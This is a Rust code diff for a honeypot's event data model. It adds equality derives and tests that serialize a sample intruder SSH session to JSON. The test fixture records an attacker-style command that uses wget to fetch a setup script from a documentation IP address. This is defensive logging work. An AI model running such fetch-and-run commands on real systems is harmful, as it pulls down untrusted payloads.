@@ -49,7 +49,7 @@ pub enum EventCategory {
     Exploit,
 }
 
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
 pub struct SourceInfo {
     pub ip: String,
     pub port: u16,
@@ -79,14 +79,14 @@ impl SourceInfo {
     }
 }
 
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
 pub struct DestinationInfo {
     pub ip: String,
     pub port: u16,
     pub honeypot_id: String,
 }
 
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
 pub struct Credentials {
     pub username: String,
     #[serde(skip_serializing_if = "Option::is_none")]
@@ -97,7 +97,7 @@ pub struct Credentials {
     pub success: bool,
 }
 
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
 pub struct CommandExecution {
     pub command: String,
     #[serde(skip_serializing_if = "Option::is_none")]
@@ -110,7 +110,7 @@ pub struct CommandExecution {
     pub working_directory: Option<String>,
 }
 
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
 pub struct HoneypotEvent {
     pub id: EventId,
     pub session_id: SessionId,
@@ -180,5 +180,70 @@ impl HoneypotEvent {
     pub fn with_metadata(mut self, key: impl Into<String>, value: serde_json::Value) -> Self {
         self.metadata.insert(key.into(), value);
         self
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn sample_event() -> HoneypotEvent {
+        HoneypotEvent::new(
+            Uuid::nil(),
+            Protocol::Ssh,
+            EventCategory::Command,
+            SourceInfo::new("203.0.113.10".to_string(), 54321),
+            DestinationInfo {
+                ip: "10.0.0.5".to_string(),
+                port: 2222,
+                honeypot_id: "ssh-01".to_string(),
+            },
+        )
+        .with_severity(Severity::High)
+        .with_credentials(Credentials {
+            username: "root".to_string(),
+            password: Some("p@ss\"\nword".to_string()),
+            ssh_key: None,
+            auth_method: "password".to_string(),
+            success: true,
+        })
+        .with_command(CommandExecution {
+            command: "wget http://198.51.100.23/setup.sh".to_string(),
+            command_name: Some("wget".to_string()),
+            arguments: Some(vec!["http://198.51.100.23/setup.sh".to_string()]),
+            output: Some("wget: unable to resolve host address".to_string()),
+            working_directory: Some("/root".to_string()),
+        })
+        .with_tag("shell_command")
+    }
+
+    #[test]
+    fn event_json_round_trip() {
+        let event = sample_event();
+        let json = serde_json::to_string(&event).unwrap();
+        let parsed: HoneypotEvent = serde_json::from_str(&json).unwrap();
+        assert_eq!(parsed.id, event.id);
+        assert_eq!(parsed.session_id, event.session_id);
+        assert_eq!(parsed.protocol, Protocol::Ssh);
+        assert_eq!(parsed.category, EventCategory::Command);
+        assert_eq!(parsed.severity, Severity::High);
+        assert_eq!(parsed.source, event.source);
+        assert_eq!(parsed.destination, event.destination);
+        assert_eq!(parsed.credentials, event.credentials);
+        assert_eq!(parsed.command, event.command);
+        assert_eq!(parsed.tags, event.tags);
+        assert!(json.contains("\"protocol\":\"ssh\""));
+        assert!(json.contains("\"category\":\"command\""));
+    }
+
+    #[test]
+    fn serialized_event_is_a_single_line() {
+        let json = serde_json::to_string(&sample_event()).unwrap();
+        assert!(!json.contains('\n'));
+        let parsed: HoneypotEvent = serde_json::from_str(&json).unwrap();
+        assert_eq!(
+            parsed.credentials.unwrap().password.as_deref(),
+            Some("p@ss\"\nword")
+        );
     }
 }
